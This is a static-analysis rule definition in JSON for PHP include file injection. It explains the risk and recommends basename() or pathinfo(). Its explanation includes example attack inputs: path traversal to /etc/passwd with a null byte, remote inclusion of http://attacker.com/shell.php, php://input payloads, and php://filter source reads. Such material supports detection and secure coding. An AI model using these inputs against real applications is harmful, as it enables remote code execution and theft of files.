{
  "id": "OPT.PHP.IncludeFileInjection",
  "name": "Include File Injection",
  "severity": "CRITICAL",
  "category": "File handling",
  "language": [
    "PHP"
  ],
  "cwe": [
    "http://cwe.mitre.org/data/definitions/98.html"
  ],
  "description": "OPT.PHP.IncludeFileInjection",
  "risk": "{{#paragraph}}\nThe PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input\nbefore its usage in include / include_once / require / require_once, or similar statements.\n\nThe attacker may be able to specify arbitrary code to be executed from a remote location, by providing an URL.\nIt could also read PHP source or other local files. Alternatively, it may be possible to use normal program behaviour to insert\nPHP code into files on the local machine which can then be included and force the code to execute, since PHP ignores everything\nin the file except for the content between php specifiers.\n\nThere are many attack avenues for this issue:\n\n1) Basic local file inclusion: include(\"includes/\" . {{{$}}}_GET['file']);\n   By providing file=.htaccess or file=../../var/lib/locate.db, attacker may see local files, even out of the webapp directory.\n   By providing file=uploads/my_hacker_upload.php, the attacker may upload code that will be executed by PHP.\n\n2) Limited local file inclusion: include(\"includes/\" . {{{$}}}_GET['file'] . \".htm\");\n   The attacker may inject null byte and get rid of the appended extension (requires magic_quotes_gpc=on in php.ini)\n   file=../../../../../../../../../etc/passwd%00\n\n3) Basic remote file inclusion: include({{{$}}}_GET['file']);\n   By providing file=http://attacker.com/shell.php, the attacker may inject arbitrary code (e.g. get a reverse shell)\n   Requires allow_url_fopen=On and allow_url_include=On in php.ini. By providing file=php://input, the attacker could add\n   payload in the POST data (like <?php phpinfo(); ?>), requires allow_url_include=On.\n   By providing file=php://filter/convert.base64-encode/resource=index.php, the attacker could read PHP code in webapp\n   (or binary files...). This is NOT restricted by allow_url_fopen or allow_url_include.\n\nAs include statements that could be partially controlled by user input is very dangerous, it is recommended to avoid dependency\non any user-controlled input in the included resource, or at least use file neutralization functions like basename() or pathinfo().\n\nNOTE: If the 'avoidUrlIncludes' is set to true, includes from a remote URL are also forbidden, as the remote server could\nbe compromised, and could return malicious code as attack vector against the analyzed software.\nAlthough since PHP 5.2 URL includes are deactivated by default, allow_url_include could be enabled in the PHP configuration.\n{{/paragraph}}\n",
  "issue": null,
  "advice": null,
  "vendor": "kiuwan"
}